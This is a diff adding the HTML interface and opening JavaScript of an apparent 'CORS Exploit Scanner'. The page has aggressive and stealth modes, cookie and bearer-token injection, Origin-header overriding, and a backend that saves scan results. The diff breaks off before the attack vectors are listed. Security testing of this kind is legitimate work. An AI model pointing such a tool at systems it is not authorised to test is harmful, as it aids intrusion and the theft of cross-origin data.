@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CORS Exploit Scanner — Ultimate Edition</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#08090d;--surf:#0d1018;--surf2:#121520;--border:#1c2130;
+    --accent:#00ffa3;--red:#ff4455;--yellow:#ffd32a;--blue:#4ea8ff;
+    --purple:#b06fff;--text:#cfd8ec;--dim:#d1dbe8;--orange:#ff8c42;
+    --cyan:#00e5ff;--pink:#ff4081;--mono:'JetBrains Mono',monospace;
+  }
+  *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+  html,body{width:100vw;height:100vh;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px}
+  body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(circle,rgba(0,255,163,.045) 1px,transparent 1px);background-size:30px 30px;pointer-events:none;z-index:0}
+  .app{position:relative;z-index:1;width:100vw;height:100vh;display:grid;grid-template-rows:44px 68px 42px 6px 1fr 28px;overflow:hidden}
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:0 24px;gap:14px;background:var(--surf);border-bottom:1px solid var(--border)}
+  .brand{display:flex;align-items:center;gap:12px}
+  .brand h1{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:#fff;letter-spacing:-.3px;white-space:nowrap}
+  .brand h1 em{color:var(--accent);font-style:normal;text-shadow:0 0 18px rgba(0,255,163,.5)}
+  .chip{font-size:9px;letter-spacing:2.5px;text-transform:uppercase;color:var(--red);border:1px solid rgba(255,68,85,.28);background:rgba(255,68,85,.07);padding:2px 9px;white-space:nowrap;animation:chipPulse 2s infinite}
+  @keyframes chipPulse{0%,100%{box-shadow:0 0 4px rgba(255,68,85,.2)}50%{box-shadow:0 0 12px rgba(255,68,85,.5)}}
+  .subtitle{font-size:10px;color:var(--dim);white-space:nowrap}
+  .author{font-size:9.5px;color:var(--dim);opacity:.5;letter-spacing:1.2px;white-space:nowrap}
+  .inputbar{display:flex;align-items:center;gap:8px;padding:0 24px;background:var(--surf2);border-bottom:1px solid var(--border);overflow-x:auto}
+  .inp{height:36px;background:rgba(0,0,0,.5);border:1px solid var(--border);color:#fff;font-family:var(--mono);font-size:12px;padding:0 12px;outline:none;transition:border-color .15s}
+  .inp:focus{border-color:var(--accent);box-shadow:0 0 0 1px rgba(0,255,163,.1)}
+  .inp::placeholder{color:var(--dim);font-size:11px}
+  .inp-url{flex:1;min-width:0}
+  .scan-btn{height:36px;padding:0 24px;background:var(--accent);color:#000;border:none;font-family:'Syne',sans-serif;font-weight:700;font-size:11.5px;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;transition:all .15s;flex-shrink:0;position:relative;overflow:hidden}
+  .scan-btn:hover{background:#00ffb5;box-shadow:0 0 16px rgba(0,255,163,.4)}
+  .scan-btn:disabled{opacity:.4;cursor:not-allowed}
+  .scan-btn.aggressive{background:var(--red);color:#fff}
+  .scan-btn.aggressive:hover{background:#ff6677;box-shadow:0 0 16px rgba(255,68,85,.4)}
+  .scan-btn.stealth{background:var(--purple);color:#fff}
+  .scan-btn.stealth:hover{background:#c090ff;box-shadow:0 0 16px rgba(176,111,255,.4)}
+  .vsep{width:1px;height:22px;background:var(--border);flex-shrink:0}
+  .ml{font-size:9px;letter-spacing:2px;color:var(--accent);text-transform:uppercase;white-space:nowrap}
+  .ml.purple{color:var(--purple)}.ml.blue{color:var(--blue)}.ml.red{color:var(--red)}.ml.orange{color:var(--orange)}
+  .method-wrap,.mode-wrap{display:flex;align-items:center;gap:5px;flex-shrink:0}
+  .mtag,.modetag{font-family:var(--mono);font-size:10.5px;padding:3px 9px;border:1px solid var(--border);color:var(--dim);background:rgba(0,0,0,.35);cursor:pointer;transition:all .12s;user-select:none;white-space:nowrap;letter-spacing:.6px}
+  .mtag.on{border-color:var(--accent);color:var(--accent);background:rgba(0,255,163,.08)}
+  .modetag.on.normal{border-color:var(--blue);color:var(--blue);background:rgba(78,168,255,.08)}
+  .modetag.on.aggressive{border-color:var(--red);color:var(--red);background:rgba(255,68,85,.08);animation:aggrPulse 1.5s infinite}
+  @keyframes aggrPulse{0%,100%{box-shadow:none}50%{box-shadow:0 0 8px rgba(255,68,85,.3)}}
+  .modetag.on.stealth{border-color:var(--purple);color:var(--purple);background:rgba(176,111,255,.08)}
+  .cred-toggle{display:flex;align-items:center;gap:6px;flex-shrink:0;cursor:pointer;padding:3px 10px;border:1px solid var(--border);background:rgba(0,0,0,.35);transition:all .12s;user-select:none}
+  .cred-toggle.on{border-color:var(--purple);background:rgba(176,111,255,.08)}
+  .ct-dot{width:7px;height:7px;border-radius:50%;background:var(--dim);transition:background .12s}
+  .cred-toggle.on .ct-dot{background:var(--purple);box-shadow:0 0 6px rgba(176,111,255,.6)}
+  .ct-label{font-size:10px;color:var(--dim);letter-spacing:.8px;transition:color .12s}
+  .cred-toggle.on .ct-label{color:var(--purple)}
+  .authbar{display:flex;align-items:center;gap:8px;padding:0 24px;height:42px;background:rgba(176,111,255,.03);border-bottom:1px solid var(--border)}
+  .auth-inp{height:28px;background:rgba(0,0,0,.5);border:1px solid var(--border);color:#fff;font-family:var(--mono);font-size:11px;padding:0 10px;outline:none;transition:border-color .15s}
+  .auth-inp:focus{border-color:var(--purple)}
+  .auth-inp::placeholder{color:var(--dim);font-size:10.5px}
+  .auth-inp-origin{width:190px;flex-shrink:0}
+  .auth-inp-cookie{flex:1;min-width:0}
+  .auth-inp-token{flex:1;min-width:0}
+  .auth-note{font-size:9px;color:var(--purple);opacity:.65;white-space:nowrap;flex-shrink:0;letter-spacing:.4px}
+  .statusbar{display:flex;align-items:center;gap:8px;padding:0 24px;font-size:10px;color:var(--dim);background:rgba(0,255,163,.02);border-bottom:1px solid transparent;opacity:0;transition:opacity .2s}
+  .statusbar.on{opacity:1;border-bottom-color:var(--border)}
+  .spin{width:9px;height:9px;border-radius:50%;border:2px solid rgba(0,255,163,.2);border-top-color:var(--accent);animation:spin .6s linear infinite;flex-shrink:0}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .prog-bar{flex:1;height:3px;background:rgba(255,255,255,.06);overflow:hidden;border-radius:2px}
+  .prog-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));width:0%;transition:width .3s;border-radius:2px;box-shadow:0 0 8px rgba(0,255,163,.4)}
+  .prog-fill.red{background:linear-gradient(90deg,var(--red),var(--orange))}
+  .prog-fill.purple{background:linear-gradient(90deg,var(--purple),var(--pink))}
+  
+  /* GRID & RESIZING */
+  .content{position:relative;width:100%;height:100%;overflow:hidden;min-height:0}
+  
+  /* SPLIT JS STYLES */
+  .split {
+    display: flex;
+    flex-direction: row;
+    width: 100%;
+    height: 100%;
+  }
+  .gutter {
+    background-color: var(--border);
+    background-repeat: no-repeat;
+    background-position: 50%;
+  }
+  .gutter.gutter-horizontal {
+    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAeCAYAAADkftS9AAAAIklEQVQoU2M4c+bMfxAGAgYYmwGrIIiDjrELjbd5MgAn3EQBOQj/EU93LVEAAAAASUVORK5CYII=');
+    cursor: col-resize;
+  }
+  .gutter.gutter-vertical {
+    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAFAQMAAABo7865AAAABlBMVEVHcEzMzMzyjG3EAAAAAXRSTlMAQObYZgAAADJJREFUCNdjYGDAAALMDIycHDEYQxjmzZt3j0EYw37mzA4wGMMYmMFQZqHMB6gHk0AWAwCrFQtjH/L7XQAAAABJRU5ErkJggg==');
+    cursor: row-resize;
+  }
+  
+  .split-h { display: flex; flex-direction: row; height: 100%; }
+  .split-v { display: flex; flex-direction: column; height: 100%; }
+  
+  .full-row{position:absolute;inset:0;background:var(--bg);z-index:10;}
+  .idle-row{display:flex;align-items:center;justify-content:center;height:100%;gap:10px;font-size:11px;color:var(--dim);letter-spacing:1.2px;padding:14px}
+  .idle-dot{width:5px;height:5px;border-radius:50%;background:var(--dim);opacity:.3}
+  .err-row{display:none;align-items:center;gap:10px;padding:10px 24px;font-size:11.5px;color:var(--red);background:rgba(255,68,85,.05);border-left:3px solid var(--red)}
+  .err-row.on{display:flex}
+  
+  .verdict-container { flex-shrink: 0; padding: 10px; border-bottom: 1px solid var(--border); }
+  .verdict{display:flex;align-items:center;gap:20px;padding:14px 28px;border-left:4px solid transparent;animation:vIn .25s ease}
+  @keyframes vIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+  .verdict.safe{background:rgba(0,255,163,.05);border-color:var(--accent)}
+  .verdict.vuln{background:rgba(255,68,85,.07);border-color:var(--red)}
+  .verdict.crit{background:rgba(255,68,85,.13);border-color:#ff1122}
+  .verdict.info{background:rgba(78,168,255,.05);border-color:var(--blue)}
+  .verdict.warn{background:rgba(255,211,42,.05);border-color:var(--yellow)}
+  .v-icon{font-size:30px;line-height:1;flex-shrink:0}
+  .v-title{font-family:'Syne',sans-serif;font-weight:800;letter-spacing:.2px;line-height:1.15;font-size:19px}
+  .verdict.safe .v-title{color:var(--accent);text-shadow:0 0 22px rgba(0,255,163,.45)}
+  .verdict.vuln .v-title,.verdict.crit .v-title{color:var(--red);text-shadow:0 0 22px rgba(255,68,85,.5)}
+  .verdict.info .v-title{color:var(--blue)}
+  .verdict.warn .v-title{color:var(--yellow)}
+  .v-desc{font-size:11px;color:var(--dim);margin-top:4px;line-height:1.6;max-width:900px}
+  .v-stats{display:flex;gap:14px;margin-top:6px}
+  .v-stat{font-size:10px;padding:2px 8px;border:1px solid var(--border);background:rgba(0,0,0,.3);color:var(--dim);letter-spacing:.5px}
+  .v-stat b{color:var(--accent)}.v-stat b.r{color:var(--red)}.v-stat b.y{color:var(--yellow)}
+  
+  .panel{display:flex;flex-direction:column;overflow:hidden;min-height:0;}
+  .ph{display:flex;align-items:center;gap:8px;padding:7px 16px;background:var(--surf);border-bottom:1px solid var(--border);flex-shrink:0}
+  .pdot{width:6px;height:6px;border-radius:50%;background:var(--accent);flex-shrink:0}
+  .pdot.red{background:var(--red)}.pdot.yellow{background:var(--yellow)}.pdot.blue{background:var(--blue)}.pdot.purple{background:var(--purple)}.pdot.orange{background:var(--orange)}
+  .ptitle{font-size:10px;letter-spacing:2.5px;text-transform:uppercase;color:var(--accent);white-space:nowrap}
+  .ptitle.red{color:var(--red)}.ptitle.yellow{color:var(--yellow)}.ptitle.blue{color:var(--blue)}.ptitle.purple{color:var(--purple)}.ptitle.orange{color:var(--orange)}
+  .pb{flex:1;overflow:auto;padding:12px 16px;min-height:0;scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+  .pb::-webkit-scrollbar{width:3px}.pb::-webkit-scrollbar-thumb{background:var(--border)}
+  
+  .h-status{display:block;font-size:9.5px;letter-spacing:1.5px;color:var(--dim);text-transform:uppercase;padding-bottom:7px;margin-bottom:6px;border-bottom:1px solid var(--border)}
+  .h-row{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);margin-bottom:2px;animation:fu .2s ease}
+  @keyframes fu{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:none}}
+  .h-k,.h-v{padding:5px 10px;font-size:11px;line-height:1.4;word-break:break-all}
+  .h-k{background:rgba(0,0,0,.55);color:var(--accent)}
+  .h-v{background:rgba(0,0,0,.3);color:var(--text)}
+  .h-v.red{color:var(--red)}.h-v.yellow{color:var(--yellow)}.h-v.green{color:var(--accent)}.h-v.purple{color:var(--purple)}
+  .scan-table{width:100%;border-collapse:collapse}
+  .scan-table th{font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;text-align:left;padding:5px 10px;border-bottom:1px solid var(--border);font-weight:400}
+  .scan-row td{padding:4px 10px;font-size:11px;border-bottom:1px solid rgba(28,33,48,.5);vertical-align:middle}
+  .scan-row td:first-child{width:24px;text-align:center}
+  .scan-row td:nth-child(2){white-space:nowrap;font-size:9px;letter-spacing:1px;color:var(--dim);width:70px}
+  .scan-row td:nth-child(3){color:var(--text);max-width:140px}
+  .scan-row td:nth-child(4){white-space:nowrap;font-size:10px;letter-spacing:.5px;width:80px}
+  .scan-row td:last-child{color:var(--dim);font-size:10px}
+  .st-pending td:nth-child(4){color:var(--dim)}
+  .st-running td:first-child,.st-running td:nth-child(4){color:var(--yellow)}
+  .st-safe td:first-child,.st-safe td:nth-child(4){color:var(--accent)}
+  .st-vuln td:first-child,.st-vuln td:nth-child(4){color:var(--red)}
+  .st-warn td:first-child,.st-warn td:nth-child(4){color:var(--yellow)}
+  .st-skip td{opacity:.4}
+  .cat-row td{background:rgba(0,255,163,.03);color:var(--accent);font-size:9px;letter-spacing:2px;text-transform:uppercase;padding:6px 10px;border-bottom:1px solid var(--border)}
+  .risk-wrap{display:flex;flex-wrap:wrap;gap:6px}
+  .rtag{font-size:10.5px;padding:4px 10px;border:1px solid;letter-spacing:.4px;line-height:1.3}
+  .rtag.high{border-color:var(--red);color:var(--red);background:rgba(255,68,85,.07)}
+  .rtag.medium{border-color:var(--yellow);color:var(--yellow);background:rgba(255,211,42,.06)}
+  .rtag.low{border-color:var(--accent);color:var(--accent);background:rgba(0,255,163,.06)}
+  .rtag.info{border-color:var(--blue);color:var(--blue);background:rgba(78,168,255,.06)}
+  .rtag.crit{border-color:var(--pink);color:var(--pink);background:rgba(255,64,129,.08);animation:critPulse 1.5s infinite}
+  @keyframes critPulse{0%,100%{box-shadow:none}50%{box-shadow:0 0 10px rgba(255,64,129,.3)}}
+  .sugg-block{margin-top:10px}
+  .sugg-title{font-size:9.5px;letter-spacing:2px;color:var(--blue);text-transform:uppercase;margin-bottom:7px;padding-bottom:5px;border-bottom:1px solid var(--border)}
+  .sugg-title.red{color:var(--red)}.sugg-title.yellow{color:var(--yellow)}.sugg-title.purple{color:var(--purple)}.sugg-title.orange{color:var(--orange)}
+  .sugg-item{display:flex;gap:10px;padding:7px 10px;margin-bottom:5px;border:1px solid rgba(78,168,255,.15);background:rgba(78,168,255,.04);animation:fu .25s ease}
+  .sugg-item.red-s{border-color:rgba(255,68,85,.2);background:rgba(255,68,85,.04)}
+  .sugg-item.yellow-s{border-color:rgba(255,211,42,.2);background:rgba(255,211,42,.04)}
+  .sugg-item.purple-s{border-color:rgba(176,111,255,.2);background:rgba(176,111,255,.04)}
+  .sugg-item.orange-s{border-color:rgba(255,140,66,.2);background:rgba(255,140,66,.04)}
+  .sugg-badge{font-size:9px;font-weight:700;letter-spacing:.5px;padding:2px 6px;flex-shrink:0;height:fit-content;margin-top:1px;color:var(--blue);background:rgba(78,168,255,.12)}
+  .sugg-item.red-s .sugg-badge{color:var(--red);background:rgba(255,68,85,.12)}
+  .sugg-item.yellow-s .sugg-badge{color:var(--yellow);background:rgba(255,211,42,.12)}
+  .sugg-item.purple-s .sugg-badge{color:var(--purple);background:rgba(176,111,255,.12)}
+  .sugg-item.orange-s .sugg-badge{color:var(--orange);background:rgba(255,140,66,.12)}
+  .sugg-head{font-size:11px;color:var(--blue);font-weight:600;margin-bottom:3px}
+  .sugg-item.red-s .sugg-head{color:var(--red)}
+  .sugg-item.yellow-s .sugg-head{color:var(--yellow)}
+  .sugg-item.purple-s .sugg-head{color:var(--purple)}
+  .sugg-item.orange-s .sugg-head{color:var(--orange)}
+  .sugg-text{font-size:10.5px;color:var(--dim);line-height:1.6}
+  .sugg-code{display:block;background:rgba(0,0,0,.4);border:1px solid var(--border);color:var(--text);font-size:10px;padding:4px 8px;margin-top:4px;word-break:break-all;white-space:pre-wrap;position:relative}
+  .copy-btn{position:absolute;top:3px;right:3px;background:rgba(0,255,163,.1);border:1px solid rgba(0,255,163,.3);color:var(--accent);font-size:9px;padding:2px 6px;cursor:pointer;font-family:var(--mono);letter-spacing:.5px}
+  .copy-btn:hover{background:rgba(0,255,163,.2)}
+  .note-box{font-size:10.5px;padding:8px 12px;margin-bottom:8px;line-height:1.7;border:1px solid}
+  .note-box.yellow{color:var(--yellow);border-color:rgba(255,211,42,.25);background:rgba(255,211,42,.05)}
+  .note-box.red{color:var(--red);border-color:rgba(255,68,85,.25);background:rgba(255,68,85,.05)}
+  .note-box.blue{color:var(--blue);border-color:rgba(78,168,255,.2);background:rgba(78,168,255,.04)}
+  .data-warn{font-size:11px;color:var(--red);background:rgba(255,68,85,.07);border:1px solid rgba(255,68,85,.2);padding:7px 12px;margin-bottom:8px;line-height:1.6}
+  .data-code{background:rgba(0,0,0,.5);border:1px solid var(--border);padding:9px 12px;font-size:11px;line-height:1.65;white-space:pre-wrap;word-break:break-all;color:var(--text);position:relative}
+  .ecenter{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:7px;text-align:center;color:var(--dim)}
+  .ecenter .icon{font-size:24px}.ecenter .lbl{font-size:10px;letter-spacing:1.5px;text-transform:uppercase}.ecenter .sub{font-size:10px;opacity:.6;margin-top:2px}
+  .footer{display:flex;align-items:center;padding:0 24px;gap:12px;border-top:1px solid var(--border);background:var(--surf)}
+  .footer-tip{font-size:9px;color:var(--dim);letter-spacing:.3px;line-height:1}
+  .footer-tip b{color:var(--yellow)}.footer-tip b.purple{color:var(--purple)}.footer-tip b.red{color:var(--red)}.footer-tip b.cyan{color:var(--cyan)}
+  .exploit-panel{margin-top:8px;border:1px solid rgba(255,68,85,.2);background:rgba(255,68,85,.03);padding:10px}
+  .exploit-title{font-size:9px;letter-spacing:2px;color:var(--red);text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+  .exploit-tabs{display:flex;gap:4px;margin-bottom:8px}
+  .exploit-tab{font-size:9.5px;padding:3px 8px;border:1px solid var(--border);color:var(--dim);cursor:pointer;transition:all .12s;letter-spacing:.5px}
+  .exploit-tab.on{border-color:var(--red);color:var(--red);background:rgba(255,68,85,.08)}
+  .exploit-code{background:rgba(0,0,0,.5);border:1px solid var(--border);padding:8px 10px;font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;color:var(--text);max-height:250px;overflow:auto;position:relative}
+  .gone{display:none!important}
+  
+  /* OVERRIDE */
+  #mainWorkspace { display: none; height: 100%; width: 100%; }
+  #mainWorkspace.on { display: flex; flex-direction: column; }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/split.js/1.6.5/split.min.js"></script>
+</head>
+
+<body>
+<div class="app">
+  <div class="topbar">
+    <div class="brand">
+      <h1>CORS <em>Exploit</em> Scanner</h1>
+      <span class="chip">ULTIMATE V2</span>
+      <span class="subtitle">// 55+ vectors · payload gen</span>
+    </div>
+    <div style="display:flex; align-items:center; gap:14px;">
+      <a href="/docs" target="_blank" style="font-size:10px; color:var(--blue); text-decoration:none; letter-spacing:1px; border:1px solid rgba(78,168,255,.3); background:rgba(78,168,255,.07); padding:4px 10px; transition:all .15s;">📖 DOCS</a>
+      <a href="/admin" style="font-size:10px; color:var(--purple); text-decoration:none; letter-spacing:1px; border:1px solid rgba(176,111,255,.3); background:rgba(176,111,255,.07); padding:4px 10px; transition:all .15s;">⚙ ADMIN</a>
+      <a href="https://www.linkedin.com/in/ramprasadsahoo/" target="_blank" class="author" style="text-decoration:none; display:flex; align-items:center; gap:5px; transition:all 0.15s; outline:none;" onmouseover="this.style.opacity='1'; this.style.color='#0a66c2';" onmouseout="this.style.opacity='0.5'; this.style.color='var(--dim)';">
+        by ram prasad
+        <svg fill="currentColor" width="11" height="11" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+      </a>
+    </div>
+  </div>
+
+  <div class="inputbar">
+    <input class="inp inp-url" id="urlInput" type="url" placeholder="https://target-api.com/endpoint" />
+    <button class="scan-btn" id="scanBtn" onclick="startScan()">▶ EXPLOIT SCAN</button>
+    <div class="vsep"></div>
+    <div class="method-wrap" id="methodTags">
+      <span class="ml">HTTP:</span>
+      <span class="mtag on" data-m="GET">GET</span>
+      <span class="mtag" data-m="POST">POST</span>
+      <span class="mtag" data-m="PUT">PUT</span>
+      <span class="mtag" data-m="DELETE">DELETE</span>
+      <span class="mtag" data-m="OPTIONS">OPTIONS</span>
+      <span class="mtag" data-m="PATCH">PATCH</span>
+    </div>
+    <div class="vsep"></div>
+    <div class="mode-wrap" id="modeTags">
+      <span class="ml red">MODE:</span>
+      <span class="modetag on normal" data-mode="normal">Normal</span>
+      <span class="modetag aggressive" data-mode="aggressive">⚡ Aggressive</span>
+      <span class="modetag stealth" data-mode="stealth">👻 Stealth</span>
+    </div>
+    <div class="vsep"></div>
+    <div class="cred-toggle" id="credToggle" onclick="toggleCred()" title="Attach browser session cookies">
+      <div class="ct-dot"></div>
+      <span class="ct-label">CREDENTIALS</span>
+    </div>
+  </div>
+
+  <div class="authbar">
+    <span class="ml purple" style="flex-shrink:0">AUTH:</span>
+    <input class="auth-inp auth-inp-origin" id="originInput" placeholder="Override Origin (optional)" />
+    <input class="auth-inp auth-inp-cookie" id="cookieInput" placeholder="Cookie: session=abc123" />
+    <input class="auth-inp auth-inp-token" id="bearerInput" placeholder="Bearer token or JWT" />
+    <span class="auth-note">🍪 Cookie/Bearer inject auth · Credentials sends browser cookies</span>
+  </div>
+
+  <div class="statusbar" id="statusBar">
+    <div class="spin"></div>
+    <span id="statusText">Scanning…</span>
+    <div class="prog-bar"><div class="prog-fill" id="progFill"></div></div>
+    <span id="progCount" style="font-size:10px;color:var(--accent);min-width:40px;text-align:right"></span>
+  </div>
+
+  <!-- CONTENT GRID: Initial State -->
+  <div class="content" id="contentArea">
+    
+    <div class="full-row" id="idleRow">
+      <div class="idle-row">
+        <div class="idle-dot"></div>
+        awaiting scan — 55+ exploit vectors ready · enter target url and press scan
+        <div class="idle-dot"></div>
+      </div>
+    </div>
+    
+    <div class="full-row gone" id="errWrapper">
+      <div class="err-row on" id="errRow">⚠ <span id="errText"></span></div>
+    </div>
+    
+    <!-- RESIZABLE WORKSPACE -->
+    <div id="mainWorkspace" class="split-v">
+      
+      <!-- TOP VERDICT STRIP -->
+      <div id="topPane" style="display:flex; flex-direction:column; overflow:hidden;">
+        <div class="verdict-container" id="verdictWrapper" style="flex:1; overflow:auto;">
+          <div class="verdict" id="verdictEl">
+            <div class="v-icon" id="vIcon"></div>
+            <div>
+              <div class="v-title" id="vTitle"></div>
+              <div class="v-desc" id="vDesc"></div>
+              <div class="v-stats" id="vStats"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- BOTTOM RESIZABLE PANELS -->
+      <div class="split" id="bottomPane" style="display:flex; flex-direction:row; overflow:hidden;">
+        
+        <!-- PAINEL 1: Vectors -->
+        <div class="panel" id="leftPanel">
+          <div class="ph"><div class="pdot" id="hDot"></div><div class="ptitle" id="hTitle">// Exploit Vectors</div></div>
+          <div class="pb" id="leftBody"></div>
+        </div>
+        
+        <!-- PAINEL 2: Risk & Exploits -->
+        <div class="panel" id="midPanel">
+          <div class="ph"><div class="pdot yellow"></div><div class="ptitle yellow">// Risk &amp; Exploits</div></div>
+          <div class="pb" id="riskBody"></div>
+        </div>
+        
+        <!-- PAINEL 3: Raw Data -->
+        <div class="panel" id="rightPanel">
+          <div class="ph"><div class="pdot" id="dDot"></div><div class="ptitle" id="dTitle">// Raw Response Data</div></div>
+          <div class="pb" id="dataBody"></div>
+        </div>
+        
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-tip">
+      <b class="red">ULTIMATE V2:</b> 55+ exploit vectors · <b class="red">Aggressive</b> = all vectors · <b class="cyan">PoC Export</b> generates HTML/curl/Python exploits · <b class="yellow">↕ ↔ Drag panel borders to resize views</b>
+    </div>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════════════════════════
+let method='GET', scanMode='normal', withCred=false, scanning=false;
+let splitInstance = null; // for Resizable Panes
+
+document.getElementById('methodTags').addEventListener('click',e=>{
+  if(!e.target.dataset.m) return;
+  document.querySelectorAll('.mtag').forEach(t=>t.classList.remove('on'));
+  e.target.classList.add('on'); method=e.target.dataset.m;
+});
+document.getElementById('modeTags').addEventListener('click',e=>{
+  if(!e.target.dataset.mode) return;
+  document.querySelectorAll('.modetag').forEach(t=>{t.classList.remove('on');t.classList.remove('normal','aggressive','stealth')});
+  e.target.classList.add('on',e.target.dataset.mode); scanMode=e.target.dataset.mode;
+  const btn=$('scanBtn');
+  btn.className='scan-btn'+(scanMode==='aggressive'?' aggressive':scanMode==='stealth'?' stealth':'');
+  btn.textContent=scanMode==='aggressive'?'⚡ AGGRESSIVE SCAN':scanMode==='stealth'?'👻 STEALTH SCAN':'▶ EXPLOIT SCAN';
+});
+function toggleCred(){withCred=!withCred;document.getElementById('credToggle').classList.toggle('on',withCred)}
+
+const CORS_H=['access-control-allow-origin','access-control-allow-methods','access-control-allow-headers',
+  'access-control-allow-credentials','access-control-expose-headers','access-control-max-age','vary'];
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// UI HELPERS
+// ═══════════════════════════════════════════════════════════════════════════════
+const $=id=>document.getElementById(id);
+const setStatus=(msg,pct)=>{$('statusBar').classList.add('on');$('statusText').textContent=msg;if(pct!=null){$('progFill').style.width=pct+'%';$('progCount').textContent=Math.round(pct)+'%'}};
+const clearStatus=()=>{$('statusBar').classList.remove('on');$('progFill').style.width='0%';$('progCount').textContent=''};
+function resetUI(){
+  clearStatus();
+  $('idleRow').classList.remove('gone');
+  $('errWrapper').classList.add('gone');
+  $('mainWorkspace').classList.remove('on');
+  $('progFill').className='prog-fill'+(scanMode==='aggressive'?' red':scanMode==='stealth'?' purple':'');
+}
+function showErr(msg){$('idleRow').classList.add('gone');$('errText').textContent=msg;$('errWrapper').classList.remove('gone')}
+function showPanels(){
+  $('idleRow').classList.add('gone');
+  $('mainWorkspace').classList.add('on');
+  
+  // Initialize Split.js if not already done
+  if (!splitInstance) {
+    try {
+      // Horizontal split (between the 3 lower panels)
+      splitInstance = Split(['#leftPanel', '#midPanel', '#rightPanel'], {
+        sizes: [30, 40, 30],
+        minSize: [200, 300, 200],
+        gutterSize: 6,
+        direction: 'horizontal',
+        cursor: 'col-resize',
+        elementStyle: (dimension, size, gutterSize) => ({
+            'flex-basis': 'calc(' + size + '% - ' + gutterSize + 'px)',
+        }),
+        gutterStyle: (dimension, gutterSize) => ({
+            'flex-basis':  gutterSize + 'px',
+        }),
+      });
+      
+      // Vertical split (between top verdict and bottom panels)
+      Split(['#topPane', '#bottomPane'], {
+        direction: 'vertical',
+        sizes: [30, 70],
+        minSize: [100, 200],
+        gutterSize: 6,
+        cursor: 'row-resize',
+      });
+    } catch (e) { console.error("Split.js init failed", e); }
+  }
+}
+function setVerdict(cls,icon,title,desc,stats){$('verdictEl').className='verdict '+cls;$('vIcon').textContent=icon;$('vTitle').textContent=title;$('vDesc').textContent=desc;$('vStats').innerHTML=stats||''}
+function setLeft(dc,tc,tt,html){$('hDot').className='pdot'+(dc?' '+dc:'');$('hTitle').className='ptitle'+(tc?' '+tc:'');$('hTitle').textContent=tt;$('leftBody').innerHTML=html}
+function setData(dc,tc,tt,html){$('dDot').className='pdot'+(dc?' '+dc:'');$('dTitle').className='ptitle'+(tc?' '+tc:'');$('dTitle').textContent=tt;$('dataBody').innerHTML=html}
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// FETCH HELPER
+// ═══════════════════════════════════════════════════════════════════════════════
+async function doFetch(url,overrideOrigin,httpMethod,credentials){
+  const m=httpMethod==='OPTIONS'?'OPTIONS':httpMethod;
+  const opts={method:m,mode:'cors',credentials,headers:{}};
+  if(overrideOrigin&&overrideOrigin!=='default') opts.headers['Origin']=overrideOrigin;
+  const cookie=$('cookieInput').value.trim(), bearer=$('bearerInput').value.trim();
+  if(cookie) opts.headers['Cookie']=cookie;
+  if(bearer) opts.headers['Authorization']=bearer.startsWith('Bearer ')?bearer:'Bearer '+bearer;
+  if(m==='OPTIONS'){opts.headers['Access-Control-Request-Method']='GET';opts.headers['Access-Control-Request-Headers']='Content-Type, Authorization, X-Custom-Header, X-Requested-With'}
+  try{
+    const res=await fetch(url,opts);
+    const ch={};for(const h of CORS_H){const v=res.headers.get(h);if(v!==null)ch[h]=v}
+    let body='',bodyOk=false;try{body=await res.text();bodyOk=body.length>0}catch(_){}
+    return{fetched:true,blocked:false,status:res.status,statusText:res.statusText,ch,body,bodyOk};
+  }catch(err){
+    const blocked=err instanceof TypeError&&err.message.toLowerCase().includes('failed to fetch');
+    return{fetched:false,blocked,error:err.message};
+  }
+}
+async function saveScanToBackend(d){try{await fetch('/api/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})}catch(e){console.error('Save failed:',e)}}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// VECTOR DEFINITIONS — 55+ VECTORS
+// ═══════════════════════════════════════════════════════════════════════════════
+function getVectors(url){
+  let parsed; try{parsed=new URL(url)}catch{return[]}
+  const host=parsed.hostname, orig=parsed.origin, proto=parsed.protocol;
+  const ALL=[
+  // ── BASIC ──
